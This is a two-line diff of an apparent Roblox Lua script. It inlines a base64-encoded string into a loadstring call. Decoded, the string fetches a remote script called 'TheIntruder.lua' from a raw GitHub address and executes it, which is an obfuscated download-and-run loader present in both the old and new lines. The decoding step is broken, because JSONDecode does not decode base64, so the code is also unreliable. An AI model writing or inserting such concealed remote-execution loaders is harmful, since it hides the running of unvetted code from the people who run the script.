@@ -1,2 +1,1 @@
-local _="bG9hZHN0cmluZyhnYW1lOkdldFNlcnZpY2UoJ0h0dHBTZXJ2aWNlJyk6R2V0QXN5bmMoJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9MaWtlZ2VubS8xL3JlZnMvaGVhZHMvbWFpbi9UaGVJbnRydWRlci5sdWEnKSkoKQ=="
-loadstring(game:GetService("HttpService"):JSONDecode('"'.._..'"'))()
+loadstring(game:GetService("HttpService"):JSONDecode('"'.."bG9hZHN0cmluZyhnYW1lOkdldFNlcnZpY2UoJ0h0dHBTZXJ2aWNlJyk6R2V0QXN5bmMoJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9MaWtlZ2VubS8xL3JlZnMvaGVhZHMvbWFpbi9UaGVJbnRydWRlci5sdWEnKSkoKQ=="..'"'))()
